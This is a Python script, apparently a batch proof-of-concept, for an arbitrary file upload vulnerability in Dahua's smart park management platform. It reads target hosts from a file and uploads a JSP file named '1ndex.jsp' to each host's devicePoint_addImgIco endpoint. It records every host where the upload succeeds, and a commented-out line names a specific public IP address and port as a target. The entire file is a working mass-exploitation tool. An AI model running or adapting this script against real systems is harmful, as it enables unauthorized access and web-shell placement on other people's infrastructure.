import argparse
import time
import requests

parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台任意文件上传 批量PoC')
parser.add_argument('-f',help='Batch detection file name',type=str)
args = parser.parse_args()
file = args.f

def get_url(file):
    with open('{}'.format(file),'r',encoding='utf-8') as f:
        for i in f:
            i = i.replace('\n', '')
            send_req("http://"+i)

def write_result(content):
    f = open("result.txt", "a", encoding="UTF-8")
    f.write('{}\n'.format(content))
    f.close()


def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/emap/devicePoint_addImgIco?hasSubsystem=true'
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Content-Type':'multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT',
        'Accept':'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection':'close'
    }
    data = (
        "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\n"
        'Content-Disposition: form-data; name="upload"; filename="1ndex.jsp"\r\n'
        "Content-Type: application/octet-stream\r\n"
        "Content-Transfer-Encoding: binary\r\n"
        "\r\n"
        "123\r\n"
        "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--"
    )
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url,headers=header,data=data,verify=False,timeout=3).json()
        if response['code'] == 1:
            result = '{} 存在任意文件上传漏洞! 请访问目标自测：{} \n'.format(url_check,
                                                            url_check + "/upload/emap/society_new/" + response['data'])
            print(result)
            write_result(result)
        time.sleep(1)
    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    if file is None:
        print('请在当前目录下新建需要检测的url.txt')
    else:
        get_url(file)

    # send_req("http://116.132.28.14:8009")